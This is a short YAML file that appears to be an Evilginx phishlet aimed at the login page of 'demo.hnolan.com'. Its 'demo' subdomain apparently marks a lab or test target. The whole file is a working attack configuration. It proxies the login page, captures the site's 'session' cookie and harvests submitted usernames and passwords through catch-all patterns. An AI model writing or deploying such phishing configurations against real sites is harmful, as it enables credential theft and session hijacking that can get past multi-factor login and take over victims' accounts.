min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true, auto_filter: true}
auth_urls:
  - '/login'
auth_tokens:
  - domain: '.hnolan.com'
    keys: ['session']
    type: 'cookie'
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'demo.hnolan.com'
  path: '/'
